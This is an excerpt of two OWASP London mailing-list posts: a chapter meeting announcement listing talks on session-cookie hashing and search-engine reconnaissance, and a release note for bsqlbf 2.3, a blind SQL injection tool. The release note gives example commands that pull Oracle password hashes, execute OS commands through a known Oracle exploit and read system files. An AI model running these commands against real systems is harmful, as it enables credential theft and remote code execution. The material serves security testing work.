Subject: [Owasp-london] Final reminder to RSVP - Next meeting Thursday the
 21st of May, at Barclays in Canary Wharf
Message-ID: <C62D9BB9.BFB1%justin.clarke@owasp.org>

This is a final reminder for the forthcoming OWASP London chapter meeting to
be held on May 21st (Thursday), at 6:30pm-8:30pm (show up at venue between
6pm-6:30pm). Note this is a week later than usual as this week clashes with
the OWASP AppSec Europe conference in Poland.

We're at a new location this time, at Barclays who have kindly agreed to
sponsor the evening:

Barclays, Presentation Suite 2, One Churchill Place, London E14 5HP

As last time, we should have plenty of time to talk and network, and should
have some time after the talks to have some more chatting time as well.

If you are planning to attend please RSVP to me (justin.clarke at owasp.org),
and I'll make sure you're added to the list of people the Barclays building
security folks are expecting.

Talks:

* Hash Cookies - A simple recipe - John Fitzpatrick

Hash cookies is a concept devised in concert with a couple of other guys
whilst discussing an application test we were working on. The goal of hash
cookies being to make session hijacking attempts infeasible through
re-hashing the session cookie on future requests to the server.

The aim of this talk is to put across the concept of hash cookies and then
have the audience don their ninja suits and break it. That way we can work
towards a robust secure mechanism for securing sessions which, hopefully,
hash cookies is a good solid step towards.


* OWASP Google Hacking Project - Christian Heinrich

Two Proof of Concepts (PoC) used during the reconnaissance phase of a
penetration test will be demonstrated:

1. "TCP Input Text" extracts TCP Ports and Fully Qualified Domain Names
(FQDN) from Google Search Results into a .csv file and individual shell
scripts for nmap and netcat to provide assurance of a listening TCP service
since the last crawl performed by the "GoogleBot".

2. "Download Indexed Cache" retrieves content indexed within the Google
Cache and supports the "Search Engine Reconnaissance" section of the
recently released OWASP Testing Guide v3. During the demonstration of
"Download Indexed Cache", the superiority of this approach will be proven
over lesser methodologies, such as "Google Hacking" and the associated
Google Hacking Database (GHDB).

The impact of mitigating controls, such as <META> Tags and robots.txt, based
on the recommendations within the "Spiders/Robots/Crawlers" section of the
recently released OWASP Testing Guide v3, will be explained.

As always, the details and schedule for the night will be available on the
chapter page ( https://www.owasp.org/index.php/London ).

See you there!

Subject: [Owasp-london] Tool Update: Bsqlbf v 2.3 with Enhanced Oracle
	Exploitation Features
Message-ID: <ea72dcc70905221144m62c5deadmaa5789b43dbf1ac8@mail.gmail.com>

Hello Everyone,

A new version of bsqlbf is now available.

About bsqlbf: Bsqlbf allows extraction of data from Blind SQL
Injections. It supports MS-SQL, Mysql, Postgres and Oracle.


The following are the new additions:

-------------------
 -type:        Type of injection:

        3:      Type 3  is extracting data with DBA privileges (e.g.
Oracle password hashes from sys.user$)
        4:      Type 4 is O.S code execution (default: ping 127.0.0.1)
        5:      Type 5 is Reading O.S files (default: c:\boot.ini)
--------------------
Type 4 (O.S code execution) supports the following sub types:

 -stype:        How you want to execute command:

        0:      SType 0 (default) is based on java, universal but
won't work against XE
        1:      SType 1 against oracle 9 with plsql_native_make_utility
        2:      SType 2 against oracle 10 with dbms_scheduler

----------------------
Examples:

./bsqlbf-v2.3.pl -url http://192.168.1.1/injection.jsp/1.jsp?p=1 -type
3 -match "true" -sql "select password from sys.user$ where rownum=1"

./bsqlbf-v2.3.pl -url http://192.168.1.1/injection.jsp/1.jsp?p=1 -type
4 -match "true" -cmd "ping notsosecure.com"

./bsqlbf-v2.3.pl -url http://192.168.1.1/injecti.jsp/1.jsp?p=1 -type 5
-match "true" -file "C:\boot.ini"

---------------------
Download from Project Homepage: http://code.google.com/p/bsqlbf-v2/
---------------------

All these additions are based on dbms_export_extension exploit. This
will work against the following oracle versions:
Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2, XE

------------------------
Enjoy...
